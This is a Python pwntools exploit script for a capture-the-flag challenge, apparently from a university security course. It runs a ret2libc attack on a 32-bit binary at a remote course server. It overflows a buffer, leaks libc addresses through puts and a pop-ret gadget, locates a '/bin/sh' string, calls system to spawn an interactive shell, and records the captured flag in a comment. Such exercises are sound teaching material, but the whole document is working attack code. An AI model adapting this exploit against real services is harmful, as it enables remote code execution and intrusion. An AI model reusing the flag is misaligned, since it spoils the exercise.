from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10018
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+31
        b *vuln+39
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

puts_plt = p32(e.plt["puts"])

main = p32(e.symbols["main"])
popret = p32(0x0804858b)
dummy_buffer = 8 + 12

print(p.recv())


def leak_libc_address(function):
    got_address = p32(e.got[function])

    dummy = b'A' * dummy_buffer
    payload = dummy
    payload += puts_plt + popret + got_address
    payload += main

    p.sendline(payload)
    sleep(1)

    response = p.recv()
    print(f"Got response: {response}")

    leaked_bytes = response[:4]
    leaked_address = hex(u32(leaked_bytes))
    print(f"Function {function} is at: {leaked_address} (libc?)")

    sleep(1)
    return leaked_address


puts_aslr = leak_libc_address('puts')
print(puts_aslr)

local_system = 0x00047cb0  # from readelf -s /lib32/libc.so.6 | grep system@@GLIBC
local_puts = 0x00072830

# serverside
system_base_address = 0x0003d3d0  # readelf -s libc-2.27.so | grep system@@GLIBC
puts_base_address = 0x00067d90

if LOCAL:
    print("Changed to local variables.")
    system_base_address = local_system
    puts_base_address = local_puts
else:
    print("Using server variables")

base_address = int(puts_aslr, 16) - puts_base_address
system_aslr = base_address + system_base_address

str_elf_address = 0x0804a024  # from readelf -s chall | grep str
dummy = b'\x90' * dummy_buffer
payload = dummy + puts_plt + popret + p32(str_elf_address) + main
p.sendline(payload)
str_response = p.recv()
bin_str_sh_bytes = u32(str_response)
print(f"Got /bin/sh at {hex(bin_str_sh_bytes)}")

print(f"Offset puts system is {hex(int(puts_aslr, 16) - system_aslr)}")

payload = dummy + p32(system_aslr) + popret + p32(bin_str_sh_bytes) + main
p.sendline(payload)

# print(p.recv())
p.interactive()  # CSCE604258{congrats_you_can_do_ret2libc_already}

if LOCAL and DEBUG:
    pause()
